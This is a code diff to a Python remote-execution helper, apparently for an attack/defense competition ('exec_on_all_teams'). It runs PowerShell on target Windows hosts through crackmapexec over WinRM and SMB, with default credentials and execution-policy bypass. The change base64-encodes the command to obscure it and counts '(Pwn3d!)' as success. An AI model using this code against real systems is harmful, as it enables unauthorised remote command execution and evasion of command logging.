@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import concurrent.futures
 import subprocess
+import base64
 from dataclasses import dataclass, field
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple
@@ -90,25 +91,48 @@ class RemoteExecutor:
         passwd: str = DEFAULT_PASS,
         timeout: int = 30,
     ) -> Tuple[bool, str]:
-        cmd = [
-            "timeout",
-            str(timeout),
-            "crackmapexec",
-            "smb",
-            ip,
-            "-u",
-            user,
-            "-p",
-            passwd,
-            "-x",
-            f'powershell -ExecutionPolicy Bypass -Command "{ps_cmd}"',
+        encoded = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
+        ps_exec = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"
+        cmd_variants = [
+            [
+                "timeout",
+                str(timeout),
+                "crackmapexec",
+                "winrm",
+                ip,
+                "-u",
+                user,
+                "-p",
+                passwd,
+                "-x",
+                ps_exec,
+            ],
+            [
+                "timeout",
+                str(timeout),
+                "crackmapexec",
+                "smb",
+                ip,
+                "-u",
+                user,
+                "-p",
+                passwd,
+                "-x",
+                ps_exec,
+            ],
         ]
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
-            success = "(Pwn3d!)" in result.stdout or "STATUS_SUCCESS" in result.stdout
-            return success, result.stdout + result.stderr
-        except Exception as exc:
-            return False, str(exc)
+        last_output = ""
+        for cmd in cmd_variants:
+            try:
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
+                output = result.stdout + result.stderr
+                last_output = output
+                success = "(Pwn3d!)" in output or "STATUS_SUCCESS" in output
+                if success:
+                    return True, output
+            except Exception as exc:
+                last_output = str(exc)
+        return False, last_output
 
     def exec_on_all_teams(
         self,
